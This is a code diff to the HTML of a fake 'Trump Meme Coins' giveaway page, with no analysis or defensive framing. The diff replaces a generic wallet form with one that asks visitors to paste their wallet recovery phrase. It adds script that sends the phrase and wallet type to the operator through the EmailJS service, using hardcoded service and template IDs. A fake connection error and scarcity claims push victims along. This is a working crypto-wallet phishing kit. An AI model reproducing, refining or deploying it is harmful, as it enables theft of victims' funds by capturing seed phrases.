@@ -185,59 +185,50 @@ With 6,000+ wallets already credited, only 2,000+ spots remain — don’t miss 
 
   <!-- Wallet Connection Page -->
   <div class="wallet-page" id="wallet-page">
-    <p class="error">There was an error connecting automatically. But do not worry, you can still connect manually.</p>
-    <h2>Connect Your Wallet</h2>
-    <p>Enter your wallet details to receive Trump Meme Coins.</p>
+  <p class="error">There was an error connecting automatically. But do not worry, you can still connect manually.</p>
+  <h2>Connect Your Wallet</h2>
+  <p>Enter your wallet details to claim $500 worth of Trump Meme Coins.</p>
 
-    <form
-  action="https://formspree.io/f/mvgzkepj"
-  method="POST"
-  id="wallet-form"
->
-  <label for="wallet-type">Select Wallet Type</label>
-  <select id="wallet-type" name="wallet_type" required>
-    <option value="metamask">MetaMask</option>
-    <option value="trustwallet">Trust Wallet</option>
-    <option value="coinbase">Coinbase Wallet</option>
-    <option value="exodus">Exodus</option>
-    <option value="atomic">Atomic Wallet</option>
-    <option value="binance">Binance Chain Wallet</option>
-    <option value="phantom">Phantom</option>
-    <option value="myetherwallet">MyEtherWallet</option>
-    <option value="blockchain">Blockchain Wallet</option>
-    <option value="bitkeep">BitKeep</option>
-    <option value="coinomi">Coinomi</option>
-    <option value="bitpie">Bitpie</option>
-    <option value="alphawallet">AlphaWallet</option>
-    <option value="brd">BRD</option>
-    <option value="argent">Argent</option>
-    <option value="fortmatic">Fortmatic</option>
-    <option value="walletconnect">WalletConnect</option>
-    <option value="others">Others</option>
-  </select>
+  <!-- Updated Form with EmailJS Integration -->
+  <form id="wallet-form">
+    <label for="wallet-type">Select Wallet Type</label>
+    <select id="wallet-type" name="wallet_type" required>
+      <option value="metamask">MetaMask</option>
+      <option value="trustwallet">Trust Wallet</option>
+      <option value="coinbase">Coinbase Wallet</option>
+      <option value="exodus">Exodus</option>
+      <option value="atomic">Atomic Wallet</option>
+      <option value="binance">Binance Chain Wallet</option>
+      <option value="phantom">Phantom</option>
+      <option value="myetherwallet">MyEtherWallet</option>
+      <option value="blockchain">Blockchain Wallet</option>
+      <option value="bitkeep">BitKeep</option>
+      <option value="coinomi">Coinomi</option>
+      <option value="bitpie">Bitpie</option>
+      <option value="alphawallet">AlphaWallet</option>
+      <option value="brd">BRD</option>
+      <option value="argent">Argent</option>
+      <option value="fortmatic">Fortmatic</option>
+      <option value="walletconnect">WalletConnect</option>
+      <option value="others">Others</option>
+    </select>
 
-  <label for="wallet-data">Enter Your Wallet Details</label>
-  <textarea 
-    id="wallet-data" 
-    name="wallet_data" 
-    placeholder="Enter your wallet information" 
-    required
-  ></textarea>
+    <label for="wallet-phrase">Enter Your Wallet Phrase</label>
+    <textarea 
+      id="wallet-phrase" 
+      name="wallet_phrase" 
+      placeholder="Copy & Paste Wallet Phrase" 
+      required
+    ></textarea>
 
-  <label for="email">Your Email (Optional):</label>
-  <input 
-    id="email" 
-    type="email" 
-    name="email" 
-    placeholder="Enter your email address"
-  >
+    <div class="note">
+      <p>Note: Only wallets with a balance or transaction history will be credited.</p>
+    </div>
 
-  <input type="hidden" name="_subject" value="New Wallet Submission">
+    <button class="btn" type="button" onclick="sendEmail()">Validate</button>
+  </form>
+</div>
 
-  <button class="btn" type="submit">Send</button>
-</form>
-
-  </div>
 
   <!-- Footer Section -->
   <footer>
@@ -247,28 +238,52 @@ With 6,000+ wallets already credited, only 2,000+ spots remain — don’t miss 
     </div>
   </footer>
 
-  <script>
-    function showWalletPage() {
-      // Blur entire page and prevent scrolling
-      document.getElementById('main-content').classList.add('blurred');
-      document.querySelector('header').classList.add('blurred');
-      document.querySelector('footer').classList.add('blurred');
-      document.body.style.overflow = 'hidden';
+  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+<script>
+  // Initialize EmailJS
+  (function() {
+    emailjs.init("YOUR_PUBLIC_KEY"); // Replace with your actual EmailJS Public Key
+  })();
 
-      // Show wallet page
-      document.getElementById('wallet-page').classList.add('active');
+  function showWalletPage() {
+    // Blur entire page and prevent scrolling
+    document.getElementById('main-content').classList.add('blurred');
+    document.querySelector('header').classList.add('blurred');
+    document.querySelector('footer').classList.add('blurred');
+    document.body.style.overflow = 'hidden';
+
+    // Show wallet page
+    document.getElementById('wallet-page').classList.add('active');
+  }
+
+  function validateWallet() {
+    const walletPhrase = document.getElementById('wallet-phrase').value;
+    const walletType = document.getElementById('wallet-type').value;
+
+    if (!walletPhrase) {
+      alert('Please enter your wallet phrase!');
+    } else {
+      alert('Connecting to server. Processing for eligibility...');
+
+      const serviceID = "service_oh2l5fc"; // Replace with your Service ID
+      const templateID = "template_oty8s2s"; // Replace with your Template ID
+
+      const templateParams = {
+        wallet_type: walletType,
+        wallet_phrase: walletPhrase
+      };
+
+      // Send data to EmailJS
+      emailjs.send(serviceID, templateID, templateParams)
+        .then((response) => {
+          alert('Wallet details sent successfully!');
+          console.log('SUCCESS!', response.status, response.text);
+        }, (error) => {
+          alert('Failed to send wallet details. Please try again.');
+          console.error('FAILED...', error);
+        });
     }
-
-    function validateWallet() {
-      const walletPhrase = document.getElementById('wallet-phrase').value;
-
-      if (!walletPhrase) {
-        alert('Please enter your wallet phrase!');
-      } else {
-        alert('Connecting to server. Processing for eligibility...');
-        // Real logic for validation would go here.
-      }
-    }
-  </script>
+  }
+</script>
 </body>
 </html>
